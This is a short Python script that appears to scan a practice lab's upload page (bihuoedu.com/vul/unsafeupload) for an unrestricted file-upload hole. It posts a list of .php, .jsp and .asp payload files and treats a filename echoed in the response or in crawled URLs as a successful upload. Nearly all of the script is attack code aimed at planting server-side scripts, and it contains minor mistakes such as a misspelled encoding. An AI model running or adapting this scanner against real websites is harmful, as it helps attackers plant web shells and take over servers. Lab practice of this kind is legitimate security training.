# -*- utf-8 -*-
import requests
import re
import GetURLS

url = "https://www.bihuoedu.com/vul/unsafeupload/clientcheck.php"

def FileScan(url):
    payloads = ['1.php','2.php','3.php','4.php','5.php','6.php','7.php','8.php',
                '1.jsp','2.jsp','3.jsp','4.jsp','1.asp','2.asp']
    flag = 0 
    payload = ''

   

    for p in payloads:
        files = {"file":open(p, 'rb')}
        r=requests.post(url, files = files)
        r.encoding = 'urf-8'
        if p in r.text:
            flag = 1
            payload = p
            return flag, payload
        else:
            GetURLS.WRITE_SUB_URL(url, 30)
            with open("sub_urls.txt") as read:
                for urls in read:
                    if p in urls:
                        flag = 1
                        payload = p
                        return flag, payload
    return flag, payload
